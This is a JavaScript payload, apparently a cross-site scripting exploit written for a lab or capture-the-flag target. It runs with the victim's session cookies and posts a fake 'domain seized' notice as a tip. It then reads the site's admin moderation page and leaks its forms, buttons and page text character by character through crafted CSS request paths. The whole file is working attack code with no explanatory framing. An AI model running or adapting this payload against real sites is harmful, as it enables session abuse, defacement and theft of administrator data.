(function(){
  var UNIQ="v6x";
  var SEIZED="<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Seized — CERT-Tervalis</title>\n<!-- CT-CASE -->\n<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n<link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap\">\n<style>\n  :root{--paper:#f4f3ef;--ink:#191713;--muted:#6a6558;--line:#cfcabb;--seal:#171410;--red:#8f2f22;\n    --sans:\"Hanken Grotesk\",-apple-system,system-ui,Segoe UI,Roboto,Arial,sans-serif;\n    --mono:\"JetBrains Mono\",ui-monospace,Menlo,Consolas,monospace}\n  *{box-sizing:border-box;margin:0}\n  body{background:var(--paper);color:var(--ink);font-family:var(--sans);line-height:1.6;min-height:100vh;\n    display:flex;align-items:center;justify-content:center;padding:40px}\n  .notice{max-width:660px;width:100%;text-align:center;border:1px solid var(--ink);\n    box-shadow:0 0 0 5px var(--paper),0 0 0 6px var(--ink);padding:52px 48px 44px}\n  .seal{margin:0 auto 26px;display:block}\n  .seal text{font-family:var(--mono);fill:var(--seal)}\n  h1{font-weight:800;letter-spacing:.01em;text-transform:uppercase;font-size:clamp(28px,4.6vw,42px);line-height:1.06}\n  .rule{width:64px;height:3px;background:var(--red);margin:22px auto 24px}\n  .lead{max-width:52ch;margin:0 auto;font-size:17px;color:#2c2a24}\n  .lead b{font-weight:700}\n  .legal{max-width:52ch;margin:24px auto 0;font-size:13.5px;color:var(--muted)}\n  .by{font-family:var(--mono);font-size:12px;letter-spacing:.16em;text-transform:uppercase;color:var(--ink);\n    margin-top:34px;padding-top:22px;border-top:1px solid var(--line)}\n  .by b{color:var(--red)}\n</style>\n</head>\n<body>\n  <main class=\"notice\">\n    <svg class=\"seal\" width=\"132\" height=\"132\" viewBox=\"0 0 200 200\" aria-label=\"CERT-Tervalis seal\">\n      <defs>\n        <path id=\"top\" d=\"M 30 100 A 70 70 0 0 1 170 100\"/>\n        <path id=\"bot\" d=\"M 30 100 A 70 70 0 0 0 170 100\"/>\n      </defs>\n      <circle cx=\"100\" cy=\"100\" r=\"94\" fill=\"none\" stroke=\"#171410\" stroke-width=\"2\"/>\n      <circle cx=\"100\" cy=\"100\" r=\"84\" fill=\"none\" stroke=\"#171410\" stroke-width=\"1\"/>\n      <circle cx=\"100\" cy=\"100\" r=\"52\" fill=\"none\" stroke=\"#171410\" stroke-width=\"1.5\"/>\n      <text font-size=\"10.2\" letter-spacing=\"1.5\" text-anchor=\"middle\"><textPath href=\"#top\" startOffset=\"50%\">COMPUTER EMERGENCY RESPONSE</textPath></text>\n      <text font-size=\"12.5\" letter-spacing=\"4\" text-anchor=\"middle\"><textPath href=\"#bot\" startOffset=\"50%\">★  TERVALIS  ★</textPath></text>\n      <g stroke=\"#171410\" stroke-width=\"3.5\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\">\n        <circle cx=\"100\" cy=\"74\" r=\"5.5\"/>\n        <line x1=\"100\" y1=\"80\" x2=\"100\" y2=\"126\"/>\n        <line x1=\"85\" y1=\"94\" x2=\"115\" y2=\"94\"/>\n        <path d=\"M 76 110 A 24 24 0 0 0 124 110\"/>\n        <line x1=\"76\" y1=\"110\" x2=\"70\" y2=\"104\"/><line x1=\"76\" y1=\"110\" x2=\"82\" y2=\"106\"/>\n        <line x1=\"124\" y1=\"110\" x2=\"130\" y2=\"104\"/><line x1=\"124\" y1=\"110\" x2=\"118\" y2=\"106\"/>\n      </g>\n    </svg>\n    <h1>This domain has<br>been seized</h1>\n    <div class=\"rule\"></div>\n    <p class=\"lead\">This domain and its associated services have been <b>seized by CERT-Tervalis</b> — the\n    Computer Emergency Response Team of Tervalis — and are no longer in service.</p>\n    <p class=\"legal\">Unauthorized access to this system is prohibited and may be subject to investigation and\n    prosecution under the laws of Tervalis.</p>\n    <div class=\"by\">By order of <b>CERT-Tervalis</b> · Cyber Division</div>\n  </main>\n</body>\n</html>\n";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }

  function exfilStr(prefix,str,maxLen){
    var n=Math.min(str.length,maxLen||60);
    for(var i=0;i<n;i++){
      var code=str.charCodeAt(i).toString(16).padStart(2,"0");
      var iHex=i.toString(16).padStart(2,"0");
      fetch("/account.php/"+UNIQ+"_"+prefix+"_"+iHex+"_"+code+".css",{credentials:"include"}).catch(function(){});
    }
    sig(prefix+"_l"+n.toString(16).padStart(2,"0"));
  }

  sig("init");

  // Step 1: Submit a PUBLIC tip (no intake) with body=SEIZED - becomes pending
  var fd=new FormData();
  fd.append("title","public-seize-pending");
  fd.append("body",SEIZED);
  fd.append("link","/cases.php");

  fetch("/tip.php",{method:"POST",body:fd,credentials:"include"}).then(function(r){
    sig("tip_submitted_"+r.status);
    // Step 2: Get moderation list to find the new tip id
    return fetch("/admin/review.php",{credentials:"include"});
  }).then(function(r){return r.text();}).then(function(listHtml){
    // Parse latest id
    var match=listHtml.match(/review\.php\?id=(\d+)/);
    var latestId=match?parseInt(match[1]):0;
    sig("latest_id_"+latestId);
    if(!latestId){sig("no_id");return;}

    // Step 3: Fetch review page for this pending tip
    return fetch("/admin/review.php?id="+latestId,{credentials:"include"})
      .then(function(r){return r.text();}).then(function(pendHtml){
        var doc=new DOMParser().parseFromString(pendHtml,"text/html");
        var forms=doc.querySelectorAll("form");
        var btns=doc.querySelectorAll("[class*=btn],[type=submit],button");
        sig("pf"+forms.length+"_pb"+btns.length);

        // Check status tag (pending/reviewed)
        var statusEl=doc.querySelector(".muted");
        if(statusEl) exfilStr("st",statusEl.textContent.trim(),20);

        // Extract form actions and all input names
        var info="";
        forms.forEach(function(f){
          var action=f.getAttribute("action")||"";
          var method=f.getAttribute("method")||"get";
          info+="|F:"+action+"["+method+"]";
          f.querySelectorAll("input,button,select").forEach(function(el){
            info+="("+el.getAttribute("name")+":"+el.getAttribute("value")+":"+el.tagName+")";
          });
        });
        btns.forEach(function(b){
          info+="|B:"+b.tagName+"["+b.getAttribute("href")+"|"+b.getAttribute("data-action")+"|"+b.getAttribute("name")+"]"+b.textContent.trim().slice(0,15);
        });

        // Find keyword hints in the pending review page
        var lHtml=pendHtml.toLowerCase();
        ["approve","reject","file","publish","seize","action","pending","moderat"].forEach(function(kw){
          if(lHtml.indexOf(kw)>=0) sig("kw_"+kw.slice(0,6));
        });

        if(info.length>0){exfilStr("fi",info,150); }
        else sig("no_fi");

        // Exfil the tail of the page (where action buttons would be)
        var mainEnd=pendHtml.lastIndexOf("</main>");
        var tail=mainEnd>0?pendHtml.slice(Math.max(0,mainEnd-200),mainEnd+7):"";
        exfilStr("tail",tail,100);
      });
  }).catch(function(e){sig("exc");});

})();
